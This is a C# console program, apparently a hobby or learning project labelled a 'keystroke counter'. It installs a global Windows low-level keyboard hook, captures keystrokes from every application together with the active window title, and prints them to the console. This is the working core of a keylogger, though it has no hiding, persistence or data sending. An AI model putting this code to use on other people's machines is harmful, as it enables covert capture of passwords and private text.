using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    // Constants for the low-level keyboard hook
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    // Constants for special keys
    private const int VK_DELETE = 0x2E;
    private const int VK_SHIFT = 0x10;
    private const int VK_CONTROL = 0x11;
    private const int VK_MENU = 0x12; // Alt key

    private static StringBuilder logBuffer = new StringBuilder(256);
    private static int keystrokesCount = 0;
    private static int oldKeystrokesCount = 0;
    private static string activeWindowTitle = "";
    private static string oldActiveWindowTitle = "";

    private static LowLevelKeyboardProc hookCallback = HookCallback;

    private static IntPtr hHookKeyboard = IntPtr.Zero;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern bool TranslateMessage([In] ref MSG lpMsg);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr DispatchMessage([In] ref MSG lpmsg);

    // Related to getting the window title
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    // Keyboard related

    [DllImport("user32.dll", SetLastError = true)]
    private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState, StringBuilder receivingBuffer, int bufferSize, uint flags);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);
    [DllImport("user32.dll")]
    static extern uint MapVirtualKey(uint uCode, uint uMapType);

    // Console related 
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleOutputCP(uint codePage);
    private const uint CP_UTF8 = 65001;  // UTF-8


    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public POINT pt;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT
    {
        public int X;
        public int Y;
    }

    public static string GetActiveWindowTitle()
    {
        IntPtr hWnd = GetForegroundWindow();
        if (hWnd == IntPtr.Zero)
        {
            return null; // No active window found
        }

        StringBuilder titleBuilder = new StringBuilder(255);
        int titleLength = GetWindowText(hWnd, titleBuilder, 255);
        if (titleLength > 0)
        {
            return titleBuilder.ToString(0, titleLength);
        }

        return null;
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        // Get active window
        activeWindowTitle = GetActiveWindowTitle();

        //if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            // Compare active window
            if (activeWindowTitle != oldActiveWindowTitle)
                Console.WriteLine($"\n[{activeWindowTitle}]");

            // Get the pressed key
            GetKeyFromCallBack(nCode, lParam);

            // Update oldActiveWindow
            oldActiveWindowTitle = activeWindowTitle;
        }

        return CallNextHookEx(hHookKeyboard, nCode, wParam, lParam);
    }

    static void GetKeyFromCallBack(int nCode, IntPtr lParam)
    {

        int vkCode = Marshal.ReadInt32(lParam);
        //int scanCode = (int)((uint)lParam >> 16 & 0xFF);

        StringBuilder keyBuffer = new StringBuilder(5);
        byte[] keyboardState = new byte[256];
        int result = ToUnicode((uint)vkCode, 0, keyboardState, keyBuffer, keyBuffer.Capacity, 0);

        bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x80) != 0;
        bool isCtrlAltPressed = (GetKeyState(VK_CONTROL) & 0x80) != 0 && (GetKeyState(VK_MENU) & 0x80) != 0;

        // Control or system keys, todo not working perfect
        if (result == -1)
        {
            int scanCode = (int)((uint)lParam >> 16 & 0xFF);
            int extendedKey = (int)((uint)lParam >> 24 & 0x1);

            if (extendedKey == 1)
            {
                // Handle extended keys
                scanCode |= 0x100;
            }

            uint virtualKey = MapVirtualKey((uint)vkCode, 0);
            uint scanCodeMapped = MapVirtualKey((uint)scanCode, 1);

            keyBuffer.Clear();
            int resultSpecial = ToUnicode(virtualKey, scanCodeMapped, keyboardState, keyBuffer, keyBuffer.Capacity, 0);

            if (vkCode == VK_DELETE && !isCtrlAltPressed && resultSpecial > 0)
            {
                // Special handling for the 'Back' key (Delete key)
                Console.Write("[Back]");
                return;
            }
        }

        // Normal keys
        if (result > 0)
        {
            char key = keyBuffer[0];

            // Special chars
            if (shiftPressed)
            {
                if (key == '1')
                    key = '!';
                // Add more keys :)
            }

            if (isCtrlAltPressed)
            {
                switch (key)
                {
                    case '2':
                        key = '@';
                        break;
                        // And even more 
                }
            }

            if (logBuffer.Length >= 5)
            {
                logBuffer.Remove(0, 1);
            }

            logBuffer.Append(key);
            Console.Write(key);
        }

    }
    static void Main()
    {
        SetConsoleOutputCP(CP_UTF8);

        bool isRunning = true;

        // Set the hook in a separate thread
        Thread hookThreadKeyboard = new Thread(() =>
        {
            hHookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, GetModuleHandle(null), 0);

            // Create and run the message loop
            MSG msg;
            while (GetMessage(out msg, IntPtr.Zero, 0, 0) != 0)
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
        });
        hookThreadKeyboard.Start();

        // TODO
        //Thread hookThreadActiveWindow = new Thread(() =>
        //{
        //
        //});
        //hookThreadActiveWindow.Start();


        Console.WriteLine("Keystroke counter is running...");
        Console.WriteLine("Press 'enter' to stop and unhook");

        while (hookThreadKeyboard.IsAlive /*&& hookThreadActiveWindow.IsAlive*/ && isRunning)
        {
            if (Console.ReadKey().Key == ConsoleKey.Enter)
            {
                isRunning = false;
            }
        }

        // Unhook the hook before exiting
        UnhookWindowsHookEx(hHookKeyboard);
        Console.WriteLine("Take care");
    }
}
